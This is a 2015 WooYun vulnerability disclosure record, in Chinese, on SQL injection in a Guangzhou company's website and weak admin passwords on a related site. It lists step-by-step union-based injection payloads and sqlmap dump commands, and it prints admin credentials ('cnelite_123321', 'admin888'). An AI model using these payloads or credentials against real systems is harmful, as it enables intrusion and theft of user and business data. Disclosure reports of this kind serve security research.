{"id": 83194, "wybug_id": "wooyun-2015-0148637", "wybug_title": "广州盛华信息主站sql注入入后台+联通秘书旁站入后台(影响用户信息/影响业务信息)", "wybug_corp": "广州盛华信息有限公司", "wybug_author": "路人甲", "wybug_date": "2015-10-22 16:53", "wybug_open_date": "2015-12-07 15:34", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "6", "wybug_status": "已交由第三方合作机构(广东省信息安全测评中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["弱口令", "字符类型注射", "管理后台对外", "注射技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-22：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-10-23：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-11-02：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-11-12：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-11-22：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-12-07：\t细节向公众公开  简要描述： 广州盛华信息有限公司存在sql注入，得到旁站数据库，入两管理后台，旁站联通秘书后台弱口令。 详细说明：  注入点：http://**.**.**.**/info.php?action=about&sortName=about_4   漏洞证明：  1=1 1=2\nhttp://**.**.**.**/info.php?action=about&sortName=about_4' and '1'='1\n\n\n\nhttp://**.**.**.**/info.php?action=about&sortName=about_4' and '1'='2\n\n\n多加一个引号http://**.**.**.**/info.php?action=about&sortName=about_4' and '1'='2’报错！！！\n\n于是开始构造语句：\nhttp://**.**.**.**/info.php?action=about&sortName=about_4' and '1'='2' union select 1 from information_schema.tables where '1'='1http://**.**.**.**/info.php?action=about&sortName=about_4' and '1'='2' union select 1,2from information_schema.tables where '1'='1http://**.**.**.**/info.php?action=about&sortName=about_4' and '1'='2' union select 1,2,3 from information_schema.tables where '1'='1http://**.**.**.**/info.php?action=about&sortName=about_4' and '1'='2' union select 1,2,3,4 from information_schema.tables where '1'='1\n到4返回正确，并显示字段3\n\n继续先找出数据库名字\nhttp://**.**.**.**/info.php?action=about&sortName=about_4' and '1'='2' union select 1,2,concat(database()),4 from information_schema.tables where '1'='1\n\n\n再找出表名\nhttp://**.**.**.**/info.php?action=about&sortName=about_4' and '1'='2' union select 1,2,group_concat(table_name),4 from information_schema.tables where table_schema=0x656c697465 and '1'='1\n\n\n再爆列名\nhttp://**.**.**.**/info.php?action=about&sortName=about_4' and '1'='2' union select 1,2,group_concat(column_name),4 from information_schema.columns where table_name=0x61646d696e and table_schema=0x656c697465 and '1'='1\n\n\n脱裤\nhttp://**.**.**.**/info.php?action=about&sortName=about_4' and '1'='2' union select 1,2,group_concat(admin_name,0x3c62723e,admin_pwd,0x3c62723e),4 from admin where '1'='1\n\n\nSqlmap下跑sqlmap -u http://**.**.**.**/info.php?action=about&sortName=about_4 -v 4 –dbs\n\n\nsqlmap -u 'http://**.**.**.**/info.php?action=about&sortName=about_4' -v 4 --tables -D elite\n\n\n\nsqlmap -u 'http://**.**.**.**/info.php?action=about&sortName=about_4' -v 4 --columns -T admin -D elite\n\n\n脱裤\nsqlmap -u 'http://**.**.**.**/info.php?action=about&sortName=about_4' -v 4 --dump -C \"admin_name,admin_pwd\" -T admin -D elite\n\n\n判断一下不是dba。\n\n不是dba，没法用sqlmap拿到os-shell接着扫描一下后台\n\nhttp://**.**.**.**/1.php  phpinfo信息泄露 \n\n后台：http://**.**.**.**/manage/login.php  解密完直接登录  admin  cnelite_123321 \n\n后台没有getshellBing 找了一下旁站\n\n看到了连通秘书，sqlmap看看其他的数据库liantong步骤如上\n\n得到管理员用户名和密码，又是弱口令！！！\n\nDump下用户名和密码\n\n多数弱口令= =扫描一下后台：http://**.**.**.**/admin.php  admin888 admin888后台截图\n\n\n\n业务信息截图\n\n领取红包，虽然我不知道是在干嘛的。。。\n\n两个站上传点都判断文件名后缀，然后重命名为时间.jpg文件。没getshell，还需努力。   修复方案：  过滤参数特殊符号，关键字，或者用php参数化查询代码。增强口令强度。ps：新手初来，求邀请码。。。。感谢感谢。。。   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-10-23 15:33 厂商回复： 非常感谢您的报告。报告中的问题已确认并复现.影响的数据：高攻击成本：低造成影响：高综合评级为：高，rank：10正在联系相关网站管理单位处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}